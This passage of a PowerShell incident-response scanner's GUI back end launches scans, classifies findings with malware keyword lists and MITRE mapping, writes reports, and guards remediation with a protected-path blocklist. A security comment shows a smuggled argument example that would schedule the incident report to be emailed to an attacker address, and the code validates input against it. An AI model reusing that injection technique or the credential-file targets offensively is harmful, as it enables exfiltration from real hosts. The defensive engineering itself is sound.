    INFO     = [regex]'\[INFO\]|\[VER\]|EXECUTED|EVALUATED'
    HUNT     = [regex]'\[HUNT\]|SCANNING|CHECKING|AUDITING'
}

$TKW = @{
    RAT        = @('rat','c2','beacon','asyncrat','njrat','remcos','darkcomet')
    Rootkit    = @('rootkit','kernel driver','bootkit','mbr','hidden process')
    Ransomware = @('ransomware','ransom','extension velocity','high entropy','ransom note')
    Keylogger  = @('keylogger','keystroke','clipboard')
    Worm       = @('worm','autorun','usb spread','network share')
    Miner      = @('cryptominer','miner','cpu abuse','xmrig')
    Trojan     = @('trojan','dropper','downloader','loader')
    Spyware    = @('spyware','adware','pup','info-stealer','stealer')
    Fileless   = @('fileless','base64 blob','registry payload','amsi bypass','etw')
    Other      = @('backdoor','exploit','cve-','lolbin','uac bypass')
}

# Captures fractional phases (55.5, 74.5/.6/.7, 99.5) as well as integers — they are
# real plan steps with their own banners, findings and MITRE map entries.
$PREX = [regex]'PHASE\s+(\d+(?:\.\d+)?)[^\d]'

# Plan-derived ceilings — must mirror the engine loader's $PhasePlan switch
# (FULL 1-80, DEEP/PARANOID/STEALTH 1-115). QUICK is a real gate: exactly 30
# phases run, but they are a NON-CONTIGUOUS subset (raw numbers climb to 75),
# so QUICK progress is reported as $ScanState.PhaseIdx (1..30 count of distinct
# headers) rather than the raw phase number. Fractional phases interpolate
# within these bounds rather than adding to the total.
$MODE_PHASES = @{ QUICK=30; FULL=80; DEEP=115; PARANOID=115; STEALTH=115 }

function Classify {
    param([string]$L)
    $sev = 'INFO'
    foreach ($k in $SEV_RX.Keys) { if ($SEV_RX[$k].IsMatch($L)) { $sev = $k; break } }
    $ll = $L.ToLower()
    $tt = $null
    foreach ($k in $TKW.Keys) {
        foreach ($kw in $TKW[$k]) { if ($ll.Contains($kw)) { $tt = $k; break } }
        if ($tt) { break }
    }
    return @{ sev = $sev; tt = $tt }
}

function Enqueue {
    param([hashtable]$Ev)
    $json = $Ev | ConvertTo-Json -Compress -Depth 4
    [void]$ScanState.EventLog.Add($json)
    # Tee to the durable event log (runspace output never reaches the console — see header).
    if ($ScanState.EventLogFile) {
        $line = ('{0} {1}{2}' -f (Get-Date -Format 'HH:mm:ss'), $json, [Environment]::NewLine)
        for ($i = 0; $i -lt 3; $i++) {
            try { [System.IO.File]::AppendAllText($ScanState.EventLogFile, $line); break } catch { Start-Sleep -Milliseconds 15 }
        }
    }
}

# ── MITRE ATT&CK resolution ($MitreMap injected from the main thread; may be $null) ─
# Fallback chain mirrors data/mitre_mapping.json's intent: most-specific keyword first,
# then the threat-type category, then the phase's dominant technique.
function Resolve-Mitre {
    param([string]$Line, [string]$ThreatType, $Phase)
    if (-not $MitreMap) { return $null }
    $ll = $Line.ToLower()
    $id = $null
    foreach ($p in $MitreMap.keyword_map.PSObject.Properties) {
        if ($p.Name -eq '_comment') { continue }
        if ($ll.Contains($p.Name)) { $id = [string]$p.Value; break }
    }
    if (-not $id -and $ThreatType) {
        $arr = $MitreMap.threat_type_map.$ThreatType
        if ($arr) { $id = [string]$arr[0] }
    }
    if (-not $id -and $Phase -gt 0) {
        # Fractional phases (55.5, 74.5, ...) have their own map keys; fall back to
        # the integer phase's entry when a fractional key is absent.
        $pe = $MitreMap.phase_map."PHASE $Phase"
        if (-not ($pe -and $pe.techniques)) { $pe = $MitreMap.phase_map."PHASE $([int][math]::Floor([double]$Phase))" }
        if ($pe -and $pe.techniques) { $id = [string]$pe.techniques[0] }
    }
    if (-not $id) { return $null }
    $t = $MitreMap.techniques.$id
    if (-not $t) { return @{ id = $id; name = $id; tactic = ''; url = '' } }
    $tactic = if ($t.tactics) { [string]$t.tactics[0] } else { '' }
    return @{ id = $id; name = $t.name; tactic = $tactic; url = $t.url }
}

# Runspace-local copy of the main thread's ConvertTo-Flag — a runspace cannot see the parent's
# functions, so this must be defined here. Keep in sync with the main-thread definition.
function ConvertTo-Flag {
    param($v)
    if ($v -is [bool]) { return $v }
    return ("$v" -match '^(?i)(true|1|yes)$')
}

# ── Extract config ──────────────────────────────────────────────────────────────
# SECURITY (C1): $mode is interpolated UNQUOTED into the child argument string below, so it
# MUST be constrained to the exact engine mode enum. Without this, a caller (e.g. a CSRF POST
# from any page the operator visits) could smuggle extra engine parameters like
# "-Schedule DAILY -SmtpTo attacker@evil" → a SYSTEM scheduled task that emails the incident
# report out. Anything not on the allowlist falls back to FULL. (The cross-origin route into
# here is now closed too — see Test-RequestAllowed — but this stays as defence in depth.)
$mode     = if ($ScanConfig.mode) { ("$($ScanConfig.mode)").Trim().ToUpper() } else { 'FULL' }
if ($mode -notin @('QUICK','FULL','DEEP','PARANOID','STEALTH')) { $mode = 'FULL' }
# $hours is interpolated unquoted into the same argument string, and a raw [int] cast on a
# non-numeric value throws — before $ScanState.Running was ever set, so the scan died with the
# GUI still showing "starting" and no error anywhere. Parse defensively and fall back to 0
# (all time), matching the fail-closed treatment $mode already gets. Bounded like the profile
# route's identical check so a silly value cannot build a nonsense -Hours argument.
$hours = 0
if ($null -ne $ScanConfig.hours) {
    if (-not [int]::TryParse("$($ScanConfig.hours)", [ref]$hours) -or $hours -lt 0 -or $hours -gt 8760) { $hours = 0 }
}
# ConvertTo-Flag, not [bool]: [bool]'false' is $true in PowerShell (any non-empty string is
# truthy), so a client sending JSON string booleans silently enabled stealth/paranoid. The
# profile-save route already used the helper; this path was the one that still did not.
$doHtml   = ConvertTo-Flag $ScanConfig.html_report
$paranoid = ConvertTo-Flag $ScanConfig.paranoid
$stealth  = ConvertTo-Flag $ScanConfig.stealth
# The three toggles that used to be inert (review #14): the GUI now sends them and each
# has a real effect here.
$doSnapshot = ConvertTo-Flag $ScanConfig.snapshot
$doBaseline = ConvertTo-Flag $ScanConfig.baseline
$doCsv      = ConvertTo-Flag $ScanConfig.csv
$iocFile  = "$($ScanConfig.ioc_file)"

# ── Reset state for new scan ────────────────────────────────────────────────────
$ScanState.Mode         = $mode
$ScanState.PhaseTotal   = if ($MODE_PHASES[$mode]) { $MODE_PHASES[$mode] } else { 115 }
$ScanState.Phase        = 0
$ScanState.PhaseIdx     = 0
$ScanState.PhaseName    = ''
$ScanState.Section      = ''
$ScanState.Elapsed      = 0
$ScanState.LineCount    = 0
$ScanState.ResultsPath  = ''
$ScanState.Running      = $true
$ScanState.ScanComplete = $false
$ScanState.StartTime    = [datetime]::Now
$ScanState.Findings.Clear()
$ScanState.EventLog.Clear()
$ScanState.ScanEpoch++   # signal already-open SSE tabs to rewind to event 0 for this new scan
foreach ($k in @($ScanState.ThreatCounts.Keys)) { $ScanState.ThreatCounts[$k] = 0 }

# ── Build PowerShell command ────────────────────────────────────────────────────
$psArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$ScanPsPath`""
$psArgs += " -Mode $mode -Hours $hours -Auto -OutDir `"$ScanReports`""
if ($doHtml)   { $psArgs += ' -Html' }
if ($paranoid) { $psArgs += ' -Paranoid' }
if ($stealth)  { $psArgs += ' -Stealth' }
if ($iocFile -and (Test-Path $iocFile)) { $psArgs += " -IocFile `"$iocFile`"" }
# "Baseline Diff Mode": hand the engine the most recent prior baseline so it can report what
# is NEW since then. Silently skipped on a first-ever run (no baseline exists yet) — and the
# file the CURRENT run is about to overwrite is captured before it is replaced.
if ($doBaseline) {
    $prevBase = Get-ChildItem -Path $ScanReports -Filter 'KrakenBaseline_*.json' -File -ErrorAction SilentlyContinue |
                Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if ($prevBase) {
        $psArgs += " -Baseline `"$($prevBase.FullName)`""
        Enqueue @{ type='log_line'; text="[INFO] Baseline diff enabled — comparing against $($prevBase.Name)"; severity='INFO'; phase=0; elapsed=0 }
    } else {
        Enqueue @{ type='log_line'; text='[INFO] Baseline diff requested but no prior baseline exists yet — this run becomes the baseline.'; severity='INFO'; phase=0; elapsed=0 }
    }
}
# "Create Rollback Snapshot": the engine only builds one inside its interactive fix mode, which
# an -Auto (GUI) run never reaches — so GUI-driven remediation had no rollback at all. Record
# the request; the remediation runspace exports the registry snapshot before it applies fixes.
$ScanState.SnapshotRequested = $doSnapshot

$psi = [System.Diagnostics.ProcessStartInfo]::new()
$psi.FileName               = 'powershell.exe'
$psi.Arguments              = $psArgs
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError  = $true
$psi.UseShellExecute        = $false
$psi.CreateNoWindow         = $true
$psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8

$proc = $null
try {
    $proc = [System.Diagnostics.Process]::Start($psi)
    $ScanState.Process = $proc

    # Drain stderr asynchronously so its buffer never fills and deadlocks the child
    $proc.BeginErrorReadLine()

    # STEALTH mode: the engine suppresses all formatted output and emits a single
    # compressed-JSON audit blob to stdout at the very end. We buffer raw lines and
    # parse that blob after exit (see post-loop block) instead of classifying text.
    $stealthLines = [System.Collections.Generic.List[string]]::new()
    if ($stealth) {
        Enqueue @{ type='log_line'; text='[STEALTH] Silent scan running — output is suppressed; results arrive at completion.'; severity='INFO'; phase=0; elapsed=0 }
    }

    while (-not $proc.StandardOutput.EndOfStream) {
        if (-not $ScanState.Running) {
            try { $proc.Kill() } catch {}
            break
        }

        $raw = $proc.StandardOutput.ReadLine()
        if ([string]::IsNullOrWhiteSpace($raw)) { continue }

        if ($stealth) { $stealthLines.Add($raw); continue }

        $elapsed = [int]([datetime]::Now - $ScanState.StartTime).TotalSeconds
        $ScanState.Elapsed = $elapsed

        # Structured finding line — the engine's Add-Finding emits one compact-JSON
        # line per registered finding in GUI runs ("[FINDING] {...}"). This is the
        # authoritative live-finding source: exact severity, no text-regex guessing.
        # The raw JSON line never reaches the log view.
        if ($raw.StartsWith('[FINDING] ')) {
            $fobj = $null
            try { $fobj = $raw.Substring(10) | ConvertFrom-Json } catch {}
            if ($fobj) {
                $fsev = "$($fobj.sev)".ToUpper()
                if ($fsev -in @('CRITICAL','HIGH','POSSIBLE')) {
                    $pnum = $ScanState.Phase
                    $pm2 = $PREX.Match("$($fobj.phase) ")
                    if ($pm2.Success) {
                        $pv2 = $pm2.Groups[1].Value
                        $pnum = if ($pv2.Contains('.')) { [double]$pv2 } else { [int]$pv2 }
                    }
                    # Canonical threat bucket: engine ThreatType is free text — try the
                    # 10 canonical names first, then keyword-classify type+description.
                    $ttRaw = "$($fobj.tt)"
                    $tt2 = $null
                    foreach ($k in $TKW.Keys) { if ($ttRaw -match "^$k") { $tt2 = $k; break } }
                    if (-not $tt2) { $tt2 = (Classify ("$ttRaw $($fobj.desc)")).tt }
                    if (-not $tt2) { $tt2 = 'Other' }
                    $mit = Resolve-Mitre "$($fobj.desc)" $tt2 $pnum
                    $f = [ordered]@{
                        type        = 'finding'
                        id          = $ScanState.Findings.Count
                        line        = ('[{0}] {1}' -f $fsev, "$($fobj.desc)")
                        severity    = $fsev
                        threat_type = $tt2
                        phase       = $pnum
                        mitre       = $mit
                        mitre_id    = if ($mit) { $mit.id } else { $null }
                        fix_action  = "$($fobj.fix)"
                        target      = "$($fobj.target)"
                        timestamp   = [datetime]::Now.ToString('HH:mm:ss')
                    }
                    [void]$ScanState.Findings.Add($f)
                    if ($ScanState.ThreatCounts.ContainsKey($tt2)) { $ScanState.ThreatCounts[$tt2]++ }
                    else { $ScanState.ThreatCounts['Other']++ }
                    Enqueue $f
                }
                continue
            }
        }

        # Phase number
        $pm = $PREX.Match($raw)
        $phaseChanged = $false
        if ($pm.Success) {
            # Keep the decimal on fractional phases so they advance the counter (and
            # force the scan_state emit below) instead of truncating to the previous
            # integer phase and looking like a stall.
            $pv = $pm.Groups[1].Value
            $newPhase = if ($pv.Contains('.')) { [double]$pv } else { [int]$pv }
            # MONOTONIC: the counter may only move FORWARD within a scan. The engine runs
            # phases in strict numeric order, but Summary.ps1's end-of-run "10 SLOWEST"
            # table prints lines like "PHASE 107 - EVENT LOG THREAT HUNTING" in DESCENDING
            # duration order — each one matched this regex and dragged the counter backwards,
            # so a finished DEEP scan reported e.g. 89/115 instead of 115/115 (observed
            # 2026-07-22). Ignoring lower numbers also immunises the counter against any
            # other trailing text that happens to mention a phase.
            if ($newPhase -gt $ScanState.Phase) {
                $ScanState.Phase = $newPhase
                # Progress index: count of distinct phase headers this scan. QUICK's
                # phase set is non-contiguous, so this (not the raw number) drives its
                # GUI counter. Clamped so an unexpected extra header can't push the
                # progress bar past 100%.
                if ($ScanState.PhaseIdx -lt $ScanState.PhaseTotal) { $ScanState.PhaseIdx++ }
                $phaseChanged = $true
            }
        }

        # Phase name from banner lines like  "──── PHASE 5 ── Description ────"
        if ($raw.Contains('PHASE') -and $raw.Contains([char]0x2500)) {
            $parts = $raw -split [char]0x2500
            if ($parts.Count -ge 3) {
                $ScanState.PhaseName = ($parts[2].Trim().Trim([char]0x2500)).Trim()
            }
        }

        # Force an immediate scan_state on every phase change so the UI counter can't
        # "skip" fast (sub-second) phases — the periodic %12 broadcast below alone lets
        # several phases pass between emits, making the counter jump (e.g. 94 -> 97).
        # QUICK reports the 1..30 progress index (its phase set is non-contiguous —
        # raw numbers would overshoot phase_total=30); findings keep the true phase.
        $dispPhase = if ($ScanState.Mode -eq 'QUICK') { $ScanState.PhaseIdx } else { $ScanState.Phase }
        if ($phaseChanged) {
            Enqueue @{
                type          = 'scan_state'
                phase         = $dispPhase
                phase_total   = $ScanState.PhaseTotal
                phase_name    = $ScanState.PhaseName
                section       = $ScanState.Section
                elapsed       = $elapsed
                threat_counts = $ScanState.ThreatCounts
                running       = $true
            }
        }

        $cl = Classify $raw
        $ScanState.LineCount++

        # Log event for every line
        Enqueue @{
            type     = 'log_line'
            text     = $raw
            severity = $cl.sev
            phase    = $ScanState.Phase
            elapsed  = $elapsed
        }

        # Finding events come exclusively from the structured "[FINDING] {...}" lines
        # intercepted above — creating them from text-severity matches here too would
        # double-count every detection. Classify is kept only for log-line coloring.

        # Periodic scan_state broadcast
        if ($ScanState.LineCount % 12 -eq 0) {
            Enqueue @{
                type          = 'scan_state'
                phase         = $dispPhase
                phase_total   = $ScanState.PhaseTotal
                phase_name    = $ScanState.PhaseName
                section       = $ScanState.Section
                elapsed       = $elapsed
                threat_counts = $ScanState.ThreatCounts
                running       = $true
            }
        }
    }

    $proc.WaitForExit()

    # ── STEALTH post-processing: parse the engine's JSON audit blob into findings ──
    if ($stealth -and $ScanState.Running) {
        $ScanState.Elapsed = [int]([datetime]::Now - $ScanState.StartTime).TotalSeconds
        $jsonLine = $null
        for ($i = $stealthLines.Count - 1; $i -ge 0; $i--) {
            $cand = $stealthLines[$i].Trim()
            if ($cand.StartsWith('{') -and $cand.EndsWith('}')) { $jsonLine = $cand; break }
        }
        if (-not $jsonLine -and $stealthLines.Count -gt 0) {
            # Fallback: blob may be split across lines — join and try.
            $joined = ($stealthLines -join '').Trim()
            if ($joined.StartsWith('{') -and $joined.EndsWith('}')) { $jsonLine = $joined }
        }
        if ($jsonLine) {
            try {
                $audit = $jsonLine | ConvertFrom-Json
                foreach ($ef in @($audit.Findings)) {
                    $sev = "$($ef.Severity)".ToUpper()
                    $tt  = "$($ef.ThreatType)"
                    if (-not $tt) { $tt = $null }
                    $phNum = 0
                    $pm2 = [regex]::Match("$($ef.Phase)", '\d+(?:\.\d+)?')
                    if ($pm2.Success) { $phNum = if ($pm2.Value.Contains('.')) { [double]$pm2.Value } else { [int]$pm2.Value } }
                    $line = if ($ef.Target) { "[$sev] $($ef.Description) -> $($ef.Target)" } else { "[$sev] $($ef.Description)" }

                    Enqueue @{ type='log_line'; text=$line; severity=$sev; phase=$phNum; elapsed=$ScanState.Elapsed }

                    if ($sev -in @('CRITICAL','HIGH','POSSIBLE')) {
                        $mit = Resolve-Mitre $line $tt $phNum
                        $f = [ordered]@{
                            type        = 'finding'
                            id          = $ScanState.Findings.Count
                            line        = $line
                            severity    = $sev
                            threat_type = $tt
                            phase       = $phNum
                            mitre       = $mit
                            mitre_id    = if ($mit) { $mit.id } else { $null }
                            timestamp   = [datetime]::Now.ToString('HH:mm:ss')
                        }
                        [void]$ScanState.Findings.Add($f)
                        if ($tt) {
                            if ($ScanState.ThreatCounts.ContainsKey($tt)) { $ScanState.ThreatCounts[$tt]++ }
                            else { $ScanState.ThreatCounts['Other']++ }
                        }
                        Enqueue $f
                    }
                }
                $ScanState.Phase    = $ScanState.PhaseTotal
                $ScanState.PhaseIdx = $ScanState.PhaseTotal   # stealth buffers stdout, so no headers incremented it
            } catch {
                Enqueue @{ type='log_line'; text="[SCAN ERROR] STEALTH JSON parse failed: $($_.Exception.Message)"; severity='CRITICAL'; phase=0; elapsed=$ScanState.Elapsed }
            }
        } else {
            Enqueue @{ type='log_line'; text='[SCAN ERROR] STEALTH mode produced no parseable JSON output.'; severity='CRITICAL'; phase=0; elapsed=$ScanState.Elapsed }
        }
    }

} catch {
    Enqueue @{
        type     = 'log_line'
        text     = "[SCAN ERROR] $($_.Exception.Message)"
        severity = 'CRITICAL'
        phase    = $ScanState.Phase
        elapsed  = $ScanState.Elapsed
    }
} finally {
    $ScanState.Running    = $false
    $ScanState.ScanComplete = $true

    # Save JSON report
    $ts = [datetime]::Now.ToString('yyyyMMdd_HHmmss')
    $rp = Join-Path $ScanReports "audit_$ts.json"
    try {
        $json = [ordered]@{
            findings      = @($ScanState.Findings)
            threat_counts = $ScanState.ThreatCounts
            mode          = $ScanState.Mode
            elapsed       = $ScanState.Elapsed
            timestamp     = [datetime]::Now.ToString('o')
        } | ConvertTo-Json -Depth 6
        # UTF-8 *without* BOM, via .NET so it's identical on PS 5.1 and 7.
        # A BOM would break strict JSON parsers (incl. browser JSON.parse); 5.1's
        # -Encoding utf8 adds one, and 'utf8BOM' isn't a valid value on 5.1.
        [System.IO.File]::WriteAllText($rp, $json, (New-Object System.Text.UTF8Encoding($false)))
        $ScanState.ResultsPath = $rp
    } catch {}

    # "Export CSV" toggle (review #14): drop a CSV alongside the JSON report so the operator
    # gets the deliverable without a second trip through /api/export/csv. Same column set and
    # the same formula-injection neutralisation as that route.
    if ($doCsv) {
        try {
            $csvPath = Join-Path $ScanReports "audit_$ts.csv"
            $sbCsv = [System.Text.StringBuilder]::new()
            [void]$sbCsv.AppendLine('"Severity","Phase","ThreatType","ATTACK_ID","ATTACK_Name","Detail","Timestamp"')
            foreach ($fx in @($ScanState.Findings)) {
                $cid = if ($fx.mitre -and $fx.mitre.id)   { "$($fx.mitre.id)" }   else { '' }
                $cnm = if ($fx.mitre -and $fx.mitre.name) { "$($fx.mitre.name)" } else { '' }
                $cl = (@("$($fx.severity)", "PH$($fx.phase)", "$($fx.threat_type)", $cid, $cnm, "$($fx.line)", "$($fx.timestamp)") |
                    ForEach-Object {
                        $c = "$_"
                        if ($c -match '^[=+\-@\t\r]') { $c = "'" + $c }   # Excel formula/DDE injection
                        '"' + ($c -replace '"','""') + '"'
                    }) -join ','
                [void]$sbCsv.AppendLine($cl)
            }
            [System.IO.File]::WriteAllText($csvPath, $sbCsv.ToString(), (New-Object System.Text.UTF8Encoding($false)))
            Enqueue @{ type='log_line'; text="[INFO] CSV export written: $csvPath"; severity='INFO'; phase=0; elapsed=$ScanState.Elapsed }
        } catch {
            Enqueue @{ type='log_line'; text="[WARN] CSV export failed: $($_.Exception.Message)"; severity='POSSIBLE'; phase=0; elapsed=$ScanState.Elapsed }
        }
    }

    # Locate the engine's *rich* report (KrakenBaseline_*.json holds FixAction/FixParam
    # per finding) written by this run — used by GUI remediation.
    $engineReport = ''
    try {
        $kb = Get-ChildItem -LiteralPath $ScanReports -Filter 'KrakenBaseline_*.json' -ErrorAction SilentlyContinue |
              Where-Object { $_.LastWriteTime -ge $ScanState.StartTime.AddSeconds(-5) } |
              Sort-Object LastWriteTime -Descending | Select-Object -First 1
        if ($kb) { $engineReport = $kb.Name }
    } catch {}
    $ScanState.EngineReport = $engineReport

    # Final state broadcast (same QUICK index rule as the in-loop emits)
    $finPhase = if ($ScanState.Mode -eq 'QUICK') { $ScanState.PhaseIdx } else { $ScanState.Phase }
    Enqueue @{
        type          = 'scan_state'
        phase         = $finPhase
        phase_total   = $ScanState.PhaseTotal
        phase_name    = $ScanState.PhaseName
        section       = $ScanState.Section
        elapsed       = $ScanState.Elapsed
        threat_counts = $ScanState.ThreatCounts
        running       = $false
    }

    # Complete event
    Enqueue @{
        type           = 'scan_complete'
        findings_count = $ScanState.Findings.Count
        threat_counts  = $ScanState.ThreatCounts
        elapsed        = $ScanState.Elapsed
        results_path   = $ScanState.ResultsPath
        engine_report  = $engineReport
    }
}
'@

# ── Remediation Script (self-contained runspace) ───────────────────────────────
# Applies the engine's FixAction/FixParam for selected findings from a rich report.
# This mirrors ZeroBreach-V23.ps1's Invoke-FixMode switch; the server is admin and is
# the documented remediation driver. Variables injected: $RemState, $RemReports,
# $ReportPath (validated inside reports/), $FixIds (string[]).
$script:REMEDIATE_SCRIPT = @'
function REnqueue {
    param([hashtable]$Ev)
    $json = $Ev | ConvertTo-Json -Compress -Depth 4
    [void]$RemState.EventLog.Add($json)
    if ($RemState.EventLogFile) {
        $line = ('{0} {1}{2}' -f (Get-Date -Format 'HH:mm:ss'), $json, [Environment]::NewLine)
        for ($i = 0; $i -lt 3; $i++) {
            try { [System.IO.File]::AppendAllText($RemState.EventLogFile, $line); break } catch { Start-Sleep -Milliseconds 15 }
        }
    }
}
function RLog { param([string]$Text, [string]$Sev = 'INFO') REnqueue @{ type='log_line'; text=$Text; severity=$Sev; phase=0; elapsed=0 } }

# Safe registry read — the runspace copy of the engine's Get-RegVal (a runspace cannot see the
# loader's helpers). Get-ItemPropertyValue throws a TERMINATING error when the value does not
# exist, which -ErrorAction SilentlyContinue does NOT suppress; called raw it aborted the whole
# reboot-queue fallback on any box that had never queued a pending rename before — i.e. the
# common case, on the code path that handles a locked malware file.
function RGet-RegVal {
    param([string]$Path, [string]$Name)
    try { Get-ItemPropertyValue -LiteralPath $Path -Name $Name -ErrorAction Stop } catch { $null }
}

# Post-condition test for DeleteReg. Returns 'gone' | 'present' | 'unknown'.
# A plain "did the read return null?" check is NOT safe here: RGet-RegVal returns $null on ANY
# failure, so when the read fails for the same reason the write failed — malware sets a DENY ACE
# for Administrators on its Run key, a standard persistence-hardening trick — the verification
# passes and the operator is told the persistence value was removed while it is still armed.
# That is the single worst lie this tool can tell, so an unreadable key is reported as unknown,
# never as success.
function Test-RRegValueGone {
    param([string]$Path, [string]$Name)
    try {
        $k = Get-Item -LiteralPath $Path -ErrorAction Stop
        if ($k.GetValueNames() -contains $Name) { return 'present' }
        return 'gone'
    } catch {
        # Key itself is missing => the value cannot exist; anything else => we genuinely do not know.
        if (-not (Test-Path -LiteralPath $Path)) { return 'gone' }
        return 'unknown'
    }
}

# SAFETY: hard backstop — mirror of Test-ProtectedTarget (main thread). The tool must NEVER
# damage the system, so even a manually-selected finding is refused if it touches a protected
# resource. Keep in sync with the main-thread copy in Get-EngineReportFindings's vicinity.
function Test-RProtected {
    param([string]$Action, [string]$Param, [string]$Target, [string]$Desc)
    $p = "$Param"; $t = "$Target"; $d = "$Desc"; $hay = "$p`n$t`n$d"
    if ($p -match '(?i)Cert:\\' -or $hay -match '(?i)(root\s+ca|trusted\s+root|certificate\s+(store|authority))') { return 'certificate trust store' }
    if ($p -match '(?i)^[a-z]:\\windows\\' -or $p -match '(?i)\\(System32|SysWOW64|WinSxS)\\') { return 'Windows system directory' }
    if ($p -match '(?i)\\(desktop\.ini|iconcache\.db|thumbs\.db|ntuser\.dat|usrclass\.dat)' -or $p -match '(?i)\.library-ms$') { return 'Windows shell/system file' }
    if ($p -match '(?i)\\Users\\[^\\]+\\\.[^\\]+$' -or $p -match '(?i)\\\.(ssh|gnupg|aws|azure|kube|docker|config)\\' -or $p -match '(?i)\\\.(bashrc|bash_profile|bash_history|profile|zshrc|gitconfig|npmrc|claude\.json)($|[^a-z])' -or $p -match '(?i)\\\.claude\\') { return 'user shell/git/ssh/cloud config (dotfile)' }
    if ($p -match '(?i)\\SafeBoot') { return 'SafeBoot registry (breaks Safe Mode)' }
    if ($Action -match '(?i)DeleteReg' -and $p -match '(?i)\\(SYSTEM\\CurrentControlSet\\(Services|Control)|Microsoft\\Windows NT\\CurrentVersion\\(Winlogon|Image File Execution Options|SystemRestore)|Cryptography)') { return 'core OS registry' }
    if ($Action -eq 'KillProcess' -and $d -match '(?i)(\b(System|smss|csrss|wininit|winlogon|services|lsass|svchost|dwm|fontdrvhost|explorer|powershell|pwsh|conhost|RuntimeBroker|MsMpEng)\b|claude|zerobreach)') { return 'critical system process or the IR tool itself' }
    return ''
}

$RemState.Remediating = $true
$applied = 0; $failed = 0; $skipped = 0; $blocked = 0
try {
    if (-not (Test-Path -LiteralPath $ReportPath)) { RLog "[REMEDIATE] Report not found: $ReportPath" 'CRITICAL'; return }
    $report = (Get-Content -LiteralPath $ReportPath -Raw) | ConvertFrom-Json
    $idset = @{}; foreach ($id in @($FixIds)) { $idset["$id"] = $true }
    $sel = @($report.Findings) | Where-Object { $idset.ContainsKey("$($_.ID)") }
    RLog ("[REMEDIATE] {0} action(s) selected from {1}." -f $sel.Count, [System.IO.Path]::GetFileName($ReportPath)) 'INFO'

    # ── Rollback snapshot ──────────────────────────────────────────────────────
    # The console fix mode has always taken one before touching anything; GUI-driven
    # remediation took none at all, so a mistaken PURGE had nothing to restore from.
    # Honours the launchpad's "Create Rollback Snapshot" checkbox. Registry only —
    # deleted FILES are recoverable via the quarantine vault instead, which is why
    # Quarantine is preferred over DeleteFile for anything not hash-confirmed.
    if ($RemState.SnapshotRequested -and @($sel).Count -gt 0) {
        try {
            $snapStamp = Get-Date -Format 'yyyyMMdd_HHmmss'
            $snapPath  = Join-Path $RemReports "rollback_$snapStamp.reg"
            $snapKeys  = @(
                @{ H='HKCU'; K='SOFTWARE\Microsoft\Windows\CurrentVersion\Run' },
                @{ H='HKLM'; K='SOFTWARE\Microsoft\Windows\CurrentVersion\Run' },
                @{ H='HKLM'; K='SYSTEM\CurrentControlSet\Services' },
                @{ H='HKLM'; K='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' },
                @{ H='HKCU'; K='SOFTWARE\Classes\CLSID' }
            )
            # A .reg file MUST open with the version magic or `regedit /S` imports nothing.
            # Keep only the first copy of that header and comment the provenance banner with ';'.
            $snapOut = New-Object System.Collections.Generic.List[string]
            $snapOut.Add('Windows Registry Editor Version 5.00')
            $snapOut.Add('')
            $snapOut.Add("; ZEROBREACH GUI REMEDIATION ROLLBACK | $(Get-Date) | $env:COMPUTERNAME")
            $snapOut.Add('; ' + ('=' * 78))
            $snapOut.Add('')
            foreach ($sk in $snapKeys) {
                $tmp = Join-Path $env:TEMP ("zb_snap_{0}_{1}.reg" -f $sk.H, ($sk.K -replace '[^A-Za-z0-9]',''))
                reg export "$($sk.H)\$($sk.K)" $tmp /y 2>$null | Out-Null
                if (Test-Path -LiteralPath $tmp) {
                    $raw = Get-Content -LiteralPath $tmp -Raw -ErrorAction SilentlyContinue
                    if ($raw) { $snapOut.Add(($raw -replace '^\s*Windows Registry Editor Version 5\.00\s*', '')) }
                    Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
                }
            }
            [System.IO.File]::WriteAllLines($snapPath, $snapOut, [System.Text.UnicodeEncoding]::new($false, $true))
            $RemState.SnapshotPath = $snapPath
            RLog "[REMEDIATE] Rollback snapshot saved: $snapPath" 'OK'
            RLog "[REMEDIATE]   -> restore with: regedit /S `"$snapPath`"" 'INFO'
        } catch {
            RLog "[REMEDIATE] Rollback snapshot FAILED ($($_.Exception.Message)) — continuing without rollback." 'POSSIBLE'
        }
    }

    foreach ($f in $sel) {
        $desc = "$($f.Description)"; if ($desc.Length -gt 70) { $desc = $desc.Substring(0,67) + '...' }

        # HARD BLOCK: never touch a protected resource, no matter what was selected.
        $why = Test-RProtected "$($f.FixAction)" "$($f.FixParam)" "$($f.Target)" "$($f.Description)"
        if ($why) {
            RLog "[BLOCKED] protected ($why) — refusing $($f.FixAction): $desc" 'POSSIBLE'
            $blocked++
            continue
        }

        RLog "[FIX] $desc" 'HUNT'
        $ok = $false
        try {
            switch ("$($f.FixAction)") {
                'DeleteFile' {
                    if (Test-Path -LiteralPath $f.FixParam) {
                        Remove-Item -LiteralPath $f.FixParam -Recurse -Force -ErrorAction Stop
                        if (Test-Path -LiteralPath $f.FixParam) {
                            $rpk = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
                            $cur = RGet-RegVal $rpk "PendingFileRenameOperations"   # raw Get-ItemPropertyValue throws when absent
                            if ($null -eq $cur) { $cur = @() }
                            Set-ItemProperty $rpk "PendingFileRenameOperations" ([string[]]($cur) + @("\??\$($f.FixParam)", "")) -Type MultiString -Force -ErrorAction SilentlyContinue
                            RLog "  -> locked; queued for reboot deletion." 'POSSIBLE'
                        } else { RLog "  -> deleted: $($f.FixParam)" 'OK' }
                        $ok = $true
                    } else { RLog "  -> already absent." 'OK'; $ok = $true }
                }
                'DeleteReg' {
                    $pts = "$($f.FixParam)" -split "\|", 2
                    if ($pts.Count -eq 2) {
                        # -LiteralPath, like every sibling action: a malware key or value name
                        # containing [ ] * or ? is otherwise treated as a wildcard pattern, the
                        # removal silently matches nothing, and the verification below would then
                        # have to decide about a value it never touched.
                        Remove-ItemProperty -LiteralPath $pts[0] -Name $pts[1] -Force -ErrorAction SilentlyContinue
                        switch (Test-RRegValueGone $pts[0] $pts[1]) {
                            'gone'    { RLog "  -> reg value removed: $($pts[1])" 'OK'; $ok = $true }
                            'present' { RLog "  -> reg value REMOVE FAILED (still present): $($pts[1])" 'POSSIBLE'; $failed++ }
                            default   { RLog "  -> reg value removal UNVERIFIABLE (key unreadable — likely an ACL denying Administrators, which is itself a finding): $($pts[1])" 'POSSIBLE'; $failed++ }
                        }
